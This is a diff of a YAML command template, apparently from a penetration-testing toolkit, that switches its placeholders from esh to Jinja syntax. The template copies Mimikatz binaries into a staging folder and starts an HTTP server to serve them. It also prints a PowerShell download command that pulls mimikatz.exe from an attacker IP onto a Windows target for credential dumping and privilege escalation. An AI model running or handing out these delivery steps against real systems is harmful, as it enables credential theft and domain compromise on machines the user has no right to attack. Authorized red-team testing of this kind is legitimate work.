@@ -1,16 +1,18 @@
----
 metadata:
-  filename: "deliver-windows-mimikatz.exe.yaml"
-  tags: ["windows", "domain", "cracking", "privesc"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/mimikatz/x64/* packstation/outbound/; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/mimikatz.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\mimikatz.exe'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-mimikatz.exe.yaml
+  tags:
+  - windows
+  - domain
+  - cracking
+  - privesc
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/mimikatz/x64/* packstation/outbound/;\
+  \ \\\necho '================================================================'; \\\
+  \necho '                      -----PowerShell-----                      '; \\\n\
+  echo 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/mimikatz.exe\
+  \ -Outfile {{ delivery_path_windows }}\\mimikatz.exe'; \\\necho '================================================================';\
+  \ \\\necho '                         -----CMD-----                          '; \\\
+  \necho '================================================================'; \\\n\
+  \ python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
+  \ }} -d packstation/outbound\n"
